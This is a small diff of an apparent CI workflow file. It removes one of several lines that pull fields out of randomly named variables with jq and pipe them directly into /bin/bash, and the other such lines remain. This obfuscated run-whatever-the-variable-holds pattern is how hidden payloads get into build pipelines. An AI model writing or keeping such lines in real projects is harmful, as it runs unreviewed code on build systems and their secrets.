@@ -22,7 +22,6 @@ jobs:
           echo $aimh17 | jq -r .by0 | /bin/bash
           echo $fz70 | jq -r .zg04 | /bin/bash
           printf '%s' "$adzuc203" | jq -r .swhbl8 | /bin/bash
-          printf '%s' "$pmv785" | jq -r .b6863 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
